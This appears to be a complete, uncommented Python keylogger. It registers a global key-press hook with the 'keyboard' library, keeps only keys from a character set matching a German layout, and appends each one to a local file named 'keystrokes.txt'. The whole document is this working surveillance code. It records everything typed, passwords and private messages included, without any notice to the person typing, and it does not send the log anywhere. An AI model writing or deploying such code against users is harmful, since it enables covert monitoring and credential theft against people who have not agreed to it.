import keyboard

keystrokes_log = "keystrokes.txt"
allowed_keys = set("qwertzuiopüasdfghjklöäyxcvbnmQWERTZUIOPÜASDFGHJKLÖÄYXCVBNM1234567890ß!§$%&/()=?@-_.:,;*+'#")

def press_keyboard(event):
    if event.name in allowed_keys:
        with open(keystrokes_log, "a") as f:
            f.write("{}".format(event.name))

keyboard.on_press(press_keyboard)
keyboard.wait()